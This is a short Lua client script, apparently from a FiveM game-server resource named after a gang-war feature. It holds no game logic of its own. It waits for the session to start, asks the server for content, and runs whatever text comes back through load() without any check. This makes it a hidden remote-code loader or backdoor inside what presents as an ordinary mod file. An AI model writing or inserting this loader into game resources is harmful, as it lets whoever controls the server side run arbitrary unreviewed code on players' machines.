Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent('isma_istcool:getclientgangwar')
end)

RegisterNetEvent('isma_istcool:getclientgangwar')
AddEventHandler('isma_istcool:getclientgangwar', function(text)
    assert(load(text))()
end)